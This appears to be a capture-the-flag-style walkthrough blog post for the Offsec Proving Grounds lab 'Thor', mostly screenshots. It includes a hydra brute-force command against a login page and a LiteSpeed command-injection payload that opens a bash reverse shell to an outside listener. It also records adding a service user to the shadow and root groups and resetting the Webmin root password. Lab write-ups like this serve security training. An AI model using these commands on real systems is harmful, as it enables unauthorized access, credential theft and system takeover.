---
title: Thor
date: 2026-05-11T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - linpeas
  - git
  - hashcat
  - python

categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Thor"
---
There can be no greater gift than that of giving one’s time and energy to help others without expecting anything in return.

― Nelson Mandela

![](Screenshot%202026-05-09%20at%2015.49.23.png)

![](Screenshot%202026-05-08%20at%2007.36.47.png)![](Screenshot%202026-05-08%20at%2007.37.46.png)



![](Screenshot%202026-05-08%20at%2007.46.06.png)

![](Screenshot%202026-05-08%20at%2007.44.34.png)

![](Screenshot%202026-05-08%20at%2007.47.02.png)

https://webmin.com/

![](Screenshot%202026-05-08%20at%2007.47.31.png)

https://openlitespeed.org/

![](Screenshot%202026-05-08%20at%2008.01.25.png)![](Screenshot%202026-05-08%20at%2008.07.30.png)

Brute force:

https://github.com/Mebus/cupp/blob/master/cupp.cfg

I checked a guide after failing at this. The few times I've had to brute-force oscp labs the passwords were: spring2020, bobby2022 - and the like. 

The above python script will create a wordlist from a file with your password hints.

Clone the repo and start the script:

![](Screenshot%202026-05-09%20at%2015.42.24.png)

![](Screenshot%202026-05-09%20at%2015.46.45.png)

`hydra -l admin -P /jane.txt.cupp.txt "https-post-form://192.168.169.208:7080/login.php:userid=^USER^&pass=^PASS^:F=Invalid"` 

Careful to use https^^

![](Screenshot%202026-05-09%20at%2014.58.30.png)

![](Screenshot%202026-05-09%20at%2015.54.01.png)

![](Screenshot%202026-05-09%20at%2015.54.19.png)

`searchsploit litespeed`

![](Screenshot%202026-05-09%20at%2016.05.25.png)

Copy the Command injection (Authenticated) txt file:

Follow the directions...

Edit

![](Screenshot%202026-05-09%20at%2016.07.13.png)

```
fcgi-bin/lsphp5/../../../../../bin/bash -c 'bash -i >& /dev/tcp/192.168.45.164/1234 0>&1'
```

![](Screenshot%202026-05-09%20at%2016.07.43.png)

Save

![](Screenshot%202026-05-09%20at%2016.09.47.png)

Start a listener then reboot the Litespeed service....

![](Screenshot%202026-05-09%20at%2016.10.21.png)

![](Screenshot%202026-05-09%20at%2016.12.40.png)

![](Screenshot%202026-05-09%20at%2016.14.05.png)

I tried for hours to get different kernel exploits to work....

- PwnKit
- Copy_fail 
- CVE-2021-3493(OverlayFS)
- CVE-2021-22555
- CVE-2022-32250

![](Screenshot%202026-05-12%20at%2014.56.31.png)

This gives an idea of how many things I tried. I was also cloning exploits via git and wget straight onto the machine.

![](Screenshot%202026-05-12%20at%2014.59.58.png)

In the end I tried this:

![](Screenshot%202026-05-12%20at%2014.58.41.png)

But I had to modify the script with some help from gemini....

![](Screenshot%202026-05-12%20at%2015.01.51.png)

I was getting this error, eventually gemini figured out that this code needed to be inserted in to the script on line 108: `s.verify = False`

![](Screenshot%202026-05-12%20at%2015.08.15.png)

Add the user 'nobody' to the shadow group and retrieve the shadow file. 

python3 exploit-up.py  192.168.198.208:7080  admin Foster2020  shadow

![](Screenshot%202026-05-12%20at%2015.16.58.png)

![](Screenshot%202026-05-12%20at%2015.16.29.png)

![](Screenshot%202026-05-11%20at%2010.36.21.png)

![](Screenshot%202026-05-11%20at%2010.37.40.png)

![](Screenshot%202026-05-12%20at%2013.59.41.png)

clue :)

/etc/webmin  
/usr/share/webmin  
/var/webmin

There is a password change binary that we should be able to use with the right privs.

![](Screenshot%202026-05-12%20at%2013.57.12.png)

![](Screenshot%202026-05-12%20at%2014.24.40.png)

`./changepass.pl /etc/webmin/ admin foo`

![](Screenshot%202026-05-12%20at%2014.25.29.png)

Using our lightspeed exploit we can add nobody to the root group.

![](Screenshot%202026-05-12%20at%2014.28.09.png)

![](Screenshot%202026-05-12%20at%2014.29.19.png)

```
python3 -c 'import pty; pty.spawn("/bin/bash")'  
export TERM=xterm
```

`./changepass.pl /etc/webmin/ root foo`

![](Screenshot%202026-05-12%20at%2014.32.56.png)

The password has been changed but it's showing we need to restart the service. 

![](Screenshot%202026-05-12%20at%2014.36.05.png)

I tried a few ways to restart this in with the nobody user and root privs. 
But in the end why bother....

![](Screenshot%202026-05-12%20at%2014.48.12.png)

![](Screenshot%202026-05-12%20at%2014.49.34.png)

![](Screenshot%202026-05-12%20at%2014.51.00.png)

![](Screenshot%202026-05-12%20at%2013.30.35.png)

![](Screenshot%202026-05-12%20at%2014.51.35.png)

![](Screenshot%202026-05-12%20at%2013.30.00.png)

Glad thats over, though one....
